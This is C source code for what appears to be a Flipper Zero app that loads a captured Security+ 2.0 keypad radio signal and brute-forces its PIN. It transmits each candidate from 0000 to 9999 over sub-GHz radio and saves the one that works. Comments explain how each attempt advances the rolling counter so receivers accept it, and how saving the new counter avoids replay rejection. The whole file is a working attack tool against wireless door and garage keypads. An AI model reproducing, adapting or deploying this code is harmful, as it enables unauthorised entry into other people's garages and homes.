/*
 * Security+ PIN — test the keypad PIN of a captured Security+ 2.0 86-bit signal.
 *
 * An 86 bit Security+ 2.0 frame is a keypad transmission. The PIN lives in the top
 * half of the frame's data word. 
 * This app loads such a file, lets you set a PIN by hand or sweep 0000..9999,
 * transmits each candidate, and writes the PIN back into the file once you find it.
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <input/input.h>
#include <storage/storage.h>
#include <dialogs/dialogs.h>
#include <notification/notification_messages.h>
#include <gui/elements.h>

#include "secplus_pin_radio.h"
#include "secplus_pin_icons.h"

#define TAG                "SecPlusPin"
#define SECPLUS_PIN_FOLDER "/ext/subghz"
#define SECPLUS_PIN_EXT    ".sub"
#define PIN_MAX            9999u
#define SWEEP_GAP_MS       120

typedef enum {
    SecPlusPinSceneMenu,
    SecPlusPinSceneEdit,
} SecPlusPinScene;

typedef struct {
    FuriMutex* mutex;
    FuriMessageQueue* queue;
    ViewPort* view_port;
    Gui* gui;
    Storage* storage;
    DialogsApp* dialogs;
    NotificationApp* notifications;

    SecPlusPinScene scene;
    uint8_t menu_index;

    // loaded signal
    bool loaded;
    /* set only by a successful save, so that result survives unloading the file */
    bool pin_saved;
    FuriString* file_path;
    FuriString* status;
    uint8_t key[8];
    uint8_t packet_1[8];
    uint32_t bit_count;
    SecPlusPinPreset preset;

    // editor
    uint16_t pin;
    uint8_t digit; // 0 = most significant
    bool sweeping;
    bool tx_busy;
    uint16_t sweep_from;
} SecPlusPin;

/* ------------------------------------------------------------------ drawing */

static void secplus_pin_draw_menu(Canvas* canvas, SecPlusPin* app) {
    static const char* items[] = {"Open .sub file", "Exit"};
    for(uint8_t i = 0; i < COUNT_OF(items); i++) {
        if(i == app->menu_index) {
            canvas_draw_box(canvas, 0, 17 + i * 12, 128, 11);
            canvas_set_color(canvas, ColorWhite);
        }
        canvas_draw_str(canvas, 4, 26 + i * 12, items[i]);
        canvas_set_color(canvas, ColorBlack);
    }
    elements_frame(canvas, 0, 41, 128, 23);
    canvas_draw_str(canvas, 4, 51, "86-bit keypad signals only");
    canvas_draw_str(canvas, 4, 62, furi_string_get_cstr(app->status));
}

/*
 * Vertical budget below the title rule is y=13..51, with the Send button owning 52..64.
 * FontBigNumbers is 15 tall, FontPrimary 8, FontSecondary 7, all measured up from the
 * baseline, so the digits get 14..29, the bordered info box 32..51, and the two lines
 * inside it sit on baselines 9 apart with no overlap.
 */
static void secplus_pin_draw_edit(Canvas* canvas, SecPlusPin* app) {
    char buf[48];

    // the four PIN digits, with a cursor under the active one
    canvas_set_font(canvas, FontBigNumbers);
    for(uint8_t i = 0; i < 4; i++) {
        uint16_t div = 1;
        for(uint8_t k = 0; k < (3 - i); k++)
            div *= 10;
        snprintf(buf, sizeof(buf), "%u", (app->pin / div) % 10);
        const uint8_t x = 34 + i * 16;
        if((i == app->digit) && !app->sweeping) {
            elements_frame(canvas, x - 3, 14, 17, 18);
        }
        canvas_draw_str(canvas, x, 30, buf);
    }

    if(app->sweeping) {
        // how far through 0000..9999 the sweep has walked from where it started
        const uint16_t done =
            (uint16_t)((app->pin + PIN_MAX + 1u - app->sweep_from) % (PIN_MAX + 1u));
        snprintf(buf, sizeof(buf), "%04u  of  %04u", done, PIN_MAX);
        canvas_set_font(canvas, FontSecondary);
        elements_progress_bar_with_text(canvas, 2, 37, 124, (float)done / (float)PIN_MAX, buf);
        elements_button_center(canvas, "Stop");
        return;
    }

    elements_frame(canvas, 0, 32, 128, 20);
    // the status gets the heavier font, the controls the lighter one
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(
        canvas, 64, 41, AlignCenter, AlignBottom, furi_string_get_cstr(app->status));
    canvas_set_font(canvas, FontSecondary);
    /* Left and Right move the cursor, so only OK is free to carry a button and the two
     * hold actions have to be spelled out instead. */
    canvas_draw_str_aligned(canvas, 64, 50, AlignCenter, AlignBottom, "hold OK sweep   < save");
    elements_button_center(canvas, "Send");
}

static void secplus_pin_draw_callback(Canvas* canvas, void* ctx) {
    SecPlusPin* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 9, "Security+ PIN");
    canvas_draw_line(canvas, 0, 12, 128, 12);
    canvas_set_font(canvas, FontSecondary);
    if(app->scene == SecPlusPinSceneMenu) {
        secplus_pin_draw_menu(canvas, app);
    } else {
        secplus_pin_draw_edit(canvas, app);
    }
    furi_mutex_release(app->mutex);
}

static void secplus_pin_input_callback(InputEvent* event, void* ctx) {
    FuriMessageQueue* queue = ctx;
    furi_message_queue_put(queue, event, FuriWaitForever);
}

/* ------------------------------------------------------------------- loading */

static bool secplus_pin_load(SecPlusPin* app, const char* path) {
    bool ok = false;
    FlipperFormat* fff = flipper_format_file_alloc(app->storage);
    FuriString* tmp = furi_string_alloc();

    do {
        if(!flipper_format_file_open_existing(fff, path)) {
            furi_string_set(app->status, "Cannot open file");
            break;
        }
        if(!flipper_format_read_string(fff, "Filetype", tmp)) {
            furi_string_set(app->status, "Not a Flipper sub file");
            break;
        }
        if(!flipper_format_read_string(fff, "Protocol", tmp)) {
            furi_string_set(app->status, "No Protocol key");
            break;
        }
        if(furi_string_cmp_str(tmp, SUBGHZ_PROTOCOL_SECPLUS_V2_NAME) != 0) {
            furi_string_printf(app->status, "Not Security+ 2.0: %s", furi_string_get_cstr(tmp));
            break;
        }
        if(!flipper_format_rewind(fff)) break;
        if(!flipper_format_read_uint32(fff, "Frequency", &app->preset.frequency, 1)) {
            furi_string_set(app->status, "No Frequency key");
            break;
        }
        if(!flipper_format_read_string(fff, "Preset", app->preset.preset_name)) {
            furi_string_set(app->status, "No Preset key");
            break;
        }

        FuriHalSubGhzPreset preset_id;
        bool preset_named =
            secplus_pin_preset_by_name(furi_string_get_cstr(app->preset.preset_name), &preset_id);
        free(app->preset.custom_preset);
        app->preset.custom_preset = NULL;
        app->preset.custom_preset_size = 0;

        if(!preset_named) {
            uint32_t count = 0;
            if(!flipper_format_get_value_count(fff, "Custom_preset_data", &count) ||
               (count == 0)) {
                furi_string_printf(
                    app->status,
                    "Unsupported preset %s",
                    furi_string_get_cstr(app->preset.preset_name));
                break;
            }
            app->preset.custom_preset = malloc(count);
            app->preset.custom_preset_size = count;
            if(!flipper_format_read_hex(
                   fff, "Custom_preset_data", app->preset.custom_preset, count)) {
                furi_string_set(app->status, "Bad custom preset");
                break;
            }
        }

        if(!flipper_format_rewind(fff)) break;
        if(!flipper_format_read_uint32(fff, "Bit", &app->bit_count, 1)) {
            furi_string_set(app->status, "No Bit key");
            break;
        }
        if(app->bit_count != 86) {
            furi_string_set(app->status, "Not an 86-bit keypad");
            break;
        }
        if(!flipper_format_read_hex(fff, "Key", app->key, sizeof(app->key))) {
            furi_string_set(app->status, "No Key value");
            break;
        }
        if(!flipper_format_rewind(fff)) break;
        if(!flipper_format_read_hex(
               fff, "Secplus_packet_1", app->packet_1, sizeof(app->packet_1))) {
            furi_string_set(app->status, "Missing packet 1");
            break;
        }

        // an already known PIN is picked up so you can resend it
        app->pin = 0;
        if(flipper_format_rewind(fff) && flipper_format_read_string(fff, "Pin", tmp)) {
            furi_string_trim(tmp);
            if(!furi_string_empty(tmp)) {
                int v = atoi(furi_string_get_cstr(tmp));
                if((v >= 0) && (v <= (int)PIN_MAX)) app->pin = (uint16_t)v;
            }
        }

        furi_string_set(app->file_path, path);
        furi_string_printf(app->status, "%luMHz  ready", app->preset.frequency / 1000000);
        ok = true;
    } while(false);

    furi_string_free(tmp);
    flipper_format_free(fff);
    return ok;
}

/* Build the in-memory signal for the current PIN and transmit it once. */
static SecPlusPinTxStatus secplus_pin_transmit(SecPlusPin* app) {
    char pin_str[8];
    SecPlusPinTxStatus status = SecPlusPinTxError;

    FlipperFormat* fff = flipper_format_string_alloc();
    do {
        if(!flipper_format_write_string_cstr(fff, "Protocol", SUBGHZ_PROTOCOL_SECPLUS_V2_NAME))
            break;
        if(!flipper_format_write_uint32(fff, "Bit", &app->bit_count, 1)) break;
        if(!flipper_format_write_hex(fff, "Key", app->key, sizeof(app->key))) break;
        if(!flipper_format_write_hex(fff, "Secplus_packet_1", app->packet_1, sizeof(app->packet_1)))
            break;
        snprintf(pin_str, sizeof(pin_str), "%04u", app->pin);
        if(!flipper_format_write_string_cstr(fff, "Pin", pin_str)) break;
        status = secplus_pin_radio_tx(&app->preset, fff);

        /* The encoder advances the counter and writes both halves back. Keeping them
         * makes every attempt carry a fresh counter, the way a real keypad does; reusing
         * the loaded frame would replay one counter 10000 times and the receiver would
         * ignore all but the first. */
        if(status == SecPlusPinTxOk) {
            uint8_t key[8];
            uint8_t packet_1[8];
            if(flipper_format_rewind(fff) &&
               flipper_format_read_hex(fff, "Key", key, sizeof(key)) &&
               flipper_format_rewind(fff) &&
               flipper_format_read_hex(fff, "Secplus_packet_1", packet_1, sizeof(packet_1))) {
                memcpy(app->key, key, sizeof(app->key));
                memcpy(app->packet_1, packet_1, sizeof(app->packet_1));
            }
        }
    } while(false);
    flipper_format_free(fff);
    return status;
}

/* Write the PIN back, together with the counter the transmissions have reached.
 * Saving the PIN alone would leave the file holding the counter it was captured
 * with, so the next load would replay counters the receiver has already seen. */
static bool secplus_pin_save(SecPlusPin* app) {
    char pin_str[8];
    snprintf(pin_str, sizeof(pin_str), "%04u", app->pin);

    FlipperFormat* fff = flipper_format_file_alloc(app->storage);
    bool ok = flipper_format_file_open_existing(fff, furi_string_get_cstr(app->file_path)) &&
              flipper_format_insert_or_update_string_cstr(fff, "Pin", pin_str) &&
              flipper_format_insert_or_update_hex(fff, "Key", app->key, sizeof(app->key)) &&
              flipper_format_insert_or_update_hex(
                  fff, "Secplus_packet_1", app->packet_1, sizeof(app->packet_1));
    flipper_format_free(fff);
    return ok;
}

/* --------------------------------------------------------------------- input */

/* Tell the user, in a modal they have to dismiss, why the file was rejected. */
static void secplus_pin_show_error(SecPlusPin* app, const char* reason) {
    DialogMessage* message = dialog_message_alloc();
    dialog_message_set_header(message, "Wrong file", 64, 3, AlignCenter, AlignTop);
    dialog_message_set_text(message, reason, 64, 32, AlignCenter, AlignCenter);
    dialog_message_set_buttons(message, NULL, "OK", NULL);
    dialog_message_show(app->dialogs, message);
    dialog_message_free(message);
}

static void secplus_pin_open_file(SecPlusPin* app) {
    DialogsFileBrowserOptions options;
    dialog_file_browser_set_basic_options(&options, SECPLUS_PIN_EXT, &I_sub1_10px);
    options.base_path = SECPLUS_PIN_FOLDER;
    options.hide_ext = false;

    FuriString* path = furi_string_alloc_set(SECPLUS_PIN_FOLDER);
    if(dialog_file_browser_show(app->dialogs, path, path, &options)) {
        furi_string_set(app->status, "Unreadable file");
        if(secplus_pin_load(app, furi_string_get_cstr(path))) {
            app->loaded = true;
            app->pin_saved = false;
            app->digit = 0;
            app->scene = SecPlusPinSceneEdit;
        } else {
            /* status now holds the reason the parser stopped */
            secplus_pin_show_error(app, furi_string_get_cstr(app->status));
        }
    }
    furi_string_free(path);
}

static void secplus_pin_pin_step(SecPlusPin* app, int8_t delta) {
    uint16_t div = 1;
    for(uint8_t k = 0; k < (3 - app->digit); k++)
        div *= 10;
    uint16_t d = (app->pin / div) % 10;
    d = (uint16_t)((d + 10 + delta) % 10);
    app->pin = (uint16_t)(app->pin - ((app->pin / div) % 10) * div + d * div);
    if(app->pin > PIN_MAX) app->pin = PIN_MAX;
}

/* ---------------------------------------------------------------------- main */

int32_t secplus_pin_app(void* p) {
    UNUSED(p);

    SecPlusPin* app = malloc(sizeof(SecPlusPin));
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->queue = furi_message_queue_alloc(16, sizeof(InputEvent));
    app->storage = furi_record_open(RECORD_STORAGE);
    app->dialogs = furi_record_open(RECORD_DIALOGS);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->file_path = furi_string_alloc();
    app->status = furi_string_alloc_set("No file loaded");
    app->preset.preset_name = furi_string_alloc_set("FuriHalSubGhzPresetOok650Async");
    app->preset.custom_preset = NULL;
    app->preset.custom_preset_size = 0;
    app->preset.frequency = 315000000;
    app->scene = SecPlusPinSceneMenu;
    app->menu_index = 0;
    app->loaded = false;
    app->pin_saved = false;
    app->pin = 0;
    app->digit = 0;
    app->sweeping = false;
    app->tx_busy = false;
    app->sweep_from = 0;
    app->bit_count = 86;
    memset(app->key, 0, sizeof(app->key));
    memset(app->packet_1, 0, sizeof(app->packet_1));

    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, secplus_pin_draw_callback, app);
    view_port_input_callback_set(app->view_port, secplus_pin_input_callback, app->queue);
    app->gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    bool running = true;
    InputEvent event;
    while(running) {
        // in sweep mode we do not block: transmit, advance, repeat
        FuriStatus status =
            furi_message_queue_get(app->queue, &event, app->sweeping ? 0 : FuriWaitForever);

        if(status == FuriStatusOk) {
            furi_mutex_acquire(app->mutex, FuriWaitForever);

            if(app->scene == SecPlusPinSceneMenu) {
                if(event.type == InputTypeShort) {
                    switch(event.key) {
                    case InputKeyUp:
                        if(app->menu_index) app->menu_index--;
                        break;
                    case InputKeyDown:
                        if(app->menu_index < 1) app->menu_index++;
                        break;
                    case InputKeyOk:
                        if(app->menu_index == 0) {
                            furi_mutex_release(app->mutex);
                            secplus_pin_open_file(app);
                            furi_mutex_acquire(app->mutex, FuriWaitForever);
                        } else {
                            running = false;
                        }
                        break;
                    case InputKeyBack:
                        running = false;
                        break;
                    default:
                        break;
                    }
                }
            } else { // edit
                if(app->sweeping && ((event.key == InputKeyOk) || (event.key == InputKeyBack)) &&
                   (event.type == InputTypeShort)) {
                    app->sweeping = false;
                    furi_string_printf(app->status, "Stopped at %04u", app->pin);
                } else if(event.type == InputTypeShort) {
                    switch(event.key) {
                    case InputKeyLeft:
                        if(app->digit) app->digit--;
                        break;
                    case InputKeyRight:
                        if(app->digit < 3) app->digit++;
                        break;
                    case InputKeyUp:
                        secplus_pin_pin_step(app, +1);
                        break;
                    case InputKeyDown:
                        secplus_pin_pin_step(app, -1);
                        break;
                    case InputKeyOk:
                        furi_string_printf(app->status, "Sending %04u...", app->pin);
                        view_port_update(app->view_port);
                        furi_mutex_release(app->mutex);
                        SecPlusPinTxStatus sent = secplus_pin_transmit(app);
                        furi_mutex_acquire(app->mutex, FuriWaitForever);
                        if(sent == SecPlusPinTxOk) {
                            furi_string_printf(app->status, "Sent %04u", app->pin);
                        } else if(sent == SecPlusPinTxNotAllowed) {
                            furi_string_printf(
                                app->status, "%luMHz TX blocked", app->preset.frequency / 1000000);
                        } else {
                            furi_string_set(app->status, "TX failed");
                        }
                        notification_message(
                            app->notifications,
                            (sent == SecPlusPinTxOk) ? &sequence_blink_green_10 : &sequence_error);
                        break;
                    case InputKeyBack:
                        app->scene = SecPlusPinSceneMenu;
                        app->loaded = false;
                        /* "315MHz ready" describes a file that is no longer open; a save
                         * result is the outcome the user was after, so that one stays */
                        if(!app->pin_saved) furi_string_set(app->status, "No file loaded");
                        break;
                    default:
                        break;
                    }
                } else if(event.type == InputTypeLong) {
                    if(event.key == InputKeyOk) {
                        app->sweeping = true;
                        app->sweep_from = app->pin;
                        furi_string_set(app->status, "Sweeping...");
                    } else if(event.key == InputKeyLeft) {
                        furi_mutex_release(app->mutex);
                        bool saved = secplus_pin_save(app);
                        furi_mutex_acquire(app->mutex, FuriWaitForever);
                        if(saved) app->pin_saved = true;
                        furi_string_printf(
                            app->status, saved ? "Saved PIN %04u" : "Save failed", app->pin);
                        notification_message(
                            app->notifications, saved ? &sequence_success : &sequence_error);
                    }
                }
            }
            furi_mutex_release(app->mutex);
            view_port_update(app->view_port);
        }

        if(app->sweeping) {
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            uint16_t pin = app->pin;
            furi_mutex_release(app->mutex);

            const SecPlusPinTxStatus sent = secplus_pin_transmit(app);

            furi_mutex_acquire(app->mutex, FuriWaitForever);
            /* a sweep that cannot transmit would silently walk all 10000 PINs */
            if(sent != SecPlusPinTxOk) {
                app->sweeping = false;
                furi_string_set(
                    app->status,
                    (sent == SecPlusPinTxNotAllowed) ? "TX blocked, sweep stopped" :
                                                       "TX failed, sweep stopped");
                notification_message(app->notifications, &sequence_error);
            } else if(pin >= PIN_MAX) {
                app->pin = 0;
                app->sweeping = false;
                furi_string_set(app->status, "Sweep finished");
            } else {
                app->pin = pin + 1;
                furi_string_printf(app->status, "Sweeping %04u", app->pin);
            }
            furi_mutex_release(app->mutex);
            view_port_update(app->view_port);
            furi_delay_ms(SWEEP_GAP_MS);
        }
    }

    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_DIALOGS);
    furi_record_close(RECORD_STORAGE);
    furi_message_queue_free(app->queue);
    furi_mutex_free(app->mutex);
    furi_string_free(app->file_path);
    furi_string_free(app->status);
    furi_string_free(app->preset.preset_name);
    free(app->preset.custom_preset);
    free(app);
    return 0;
}
